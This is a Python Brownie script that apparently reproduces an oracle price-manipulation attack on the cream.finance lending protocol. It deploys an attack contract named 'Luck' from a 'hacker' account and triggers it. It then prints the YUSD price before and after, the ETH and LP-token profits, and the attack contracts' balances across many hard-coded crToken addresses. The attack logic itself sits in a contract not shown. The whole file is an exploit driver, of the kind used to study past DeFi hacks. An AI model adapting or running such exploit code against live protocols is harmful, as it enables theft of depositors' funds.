from brownie import accounts, interface, Luck
from rich import print as rp

ctokens = [
            '0xfd609a03B393F1A1cFcAcEdaBf068CAD09a924E2',
            '0x228619CCa194Fbe3Ebeb2f835eC1eA5080DaFbb2',
            '0xeFF039C3c1D668f408d09dD7B63008622a77532C',
            '0x299e254A8a165bBeB76D9D69305013329Eea3a3B',
            '0x8379BAA817c5c5aB929b03ee8E3c48e45018Ae41',
            '0x2A537Fa9FFaea8C1A41D3C2B68a9cb791529366D',
            '0xe89a6D0509faF730BD707bf868d9A2A744a363C7',
            '0x44fbeBd2F576670a6C33f6Fc0B00aA8c5753b322',
            '0x8C3B7a4320ba70f8239F83770c4015B5bc4e6F91',
            '0x797AAB1ce7c01eB727ab980762bA88e7133d2157',
            '0x1F9b4756B008106C806c7E64322d7eD3B72cB284',
            '0x523EFFC8bFEfC2948211A05A905F761CBA5E8e9E',
            '0x10FDBD1e48eE2fD9336a482D746138AE19e649Db',
            '0x4112a717edD051F77d834A6703a1eF5e3d73387F',
            '0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4']

def main():
    ypool_lp = interface.ERC20('0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8')       
    cr_eth = interface.ICEther('0xD06527D5e56A3495252A528C4987003b712860eE')
    unitroller = interface.IUnitroller('0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258')
    oracle = interface.IPriceOracleProxy(
        '0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d')

    hacker = accounts[0]
    l = Luck.deploy({
        'from': hacker
    })

    rp(f'[bold green]Before[/] The YUSD\'s price in cream.finance oracle: {oracle.getUnderlyingPrice(ctokens[-1])}')

    l.luck({
        'from': hacker
    })
    l2 = l.criminal_accomplice()

    rp(f'[bold green]After[/] The YUSD\'s price in cream.finance oracle: {oracle.getUnderlyingPrice(ctokens[-1])}')

    rp('\n\n:vampire: [bold red]The profit list:[/]')
    rp('[bold green]ETH[/] profits: ', l.balance() / 1e18)
    rp('[bold green]Ypool_LP[/] profits: ', ypool_lp.balanceOf(l) / 1e18)
    _, _liquidity, _shortfall = unitroller.getAccountLiquidity(l)
    rp(f'[bold red]attack contract1 Luck\'s liquidity in cream.finance[/]: liquidity = {_liquidity}, shortfall = {_shortfall}')
    _, _liquidity, _shortfall = unitroller.getAccountLiquidity(l2)
    rp(f'[bold red]attack contract2 LuckPartner\'s liquidity in cream.finance[/]: liquidity = {_liquidity}, shortfall = {_shortfall}')
    rp(f'[bold green]CrETH cash: {cr_eth.getCash()}, CrETH profits: {cr_eth.balanceOf(l)}')
    for ctoken in ctokens:
        t = interface.ICrErc20(ctoken)
        underlying_token = interface.ERC20(t.underlying())
        rp(f"The cash of [bold green]{t.symbol()}[/] in cream.finance is {t.getCash()}.\n[bold green]{t.symbol()}[/] balance: {t.balanceOf(l)}, [bold green]{underlying_token.symbol()}[/] balance: {underlying_token.balanceOf(l)}")    